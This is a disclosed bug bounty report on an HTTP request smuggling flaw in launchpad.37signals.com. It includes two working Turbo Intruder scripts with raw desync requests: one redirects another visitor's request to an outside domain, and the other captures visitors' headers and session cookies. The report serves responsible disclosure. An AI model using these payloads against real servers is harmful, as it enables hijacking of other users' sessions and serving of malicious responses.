# Unauthenticated request smuggling on launchpad.37signals.com

## Report Details
- **Report ID**: 867577
- **URL**: https://hackerone.com/reports/867577
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-05-07T04:16:23.389Z
- **Disclosed**: 2020-10-28T14:57:15.180Z

## Reporter
- **Username**: hazimaslam
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: basecamp

## Vulnerability Information
## Description

By sending an ambiguous request on the rails application on `launchpad.37signals.com`, an attacker can desynchronise frontend and backend servers, leaving the socket to the backend server poisoned with a harmful response. This response will then be served up to the next visitor.

The desync occurs when sending a request with a `Content-Length` header and a valid `Transfer-Encoding` header followed by an invalid `Transfer-Encoding` header. The frontend server only examines the second `Transfer-Encoding` which is invalid, so it uses the `Content-Length` instead. However the backend server prioritises the valid `Transfer-Encoding` header and therefore ignores the `Content-Length`.

## Validation Steps

To replicate this bug, run the following script in Turbo Intruder. After issuing a desync request, it simulates 6 requests from normal visitors one of which gets redirected to `hazimaslam.com`.

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 69
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar'''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,la;q=0.8
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D

'''
    for i in range(6):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```

{F818615}

### Capturing and storing normal visitors' request headers and cookies

By prefixing the victim's request with a crafted storage request, we can make the application save their request and display it back to us and steal any authentication cookies/headers.

1. Login and visit https://launchpad.37signals.com/identity/edit
2. Save changes and intercept the request.
3. Copy the values of following from intercepted request and paste in the script where indicated:

- identity_id (cookie)
- session_token (cookie)
- _launchpad_session (cookie)
- authenticity_token (parameter)


```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d='''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D
Foo: bar

'''
    for i in range(6):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```
Run the script in Turbo Intruder and refresh https://launchpad.37signals.com/identity/edit to see captured headers and cookies.

Here is the video demonstration for this:

{F818731}

## Impact

- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.

- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.

- It is also possible to capture visitors' request headers and cookies.

- No authentication and interaction required.

## Attachments
- Screenshot_2020-05-07_at_7.51.16_AM.png
- Screen_Recording_2020-05-07_at_9.02.52_AM.mov
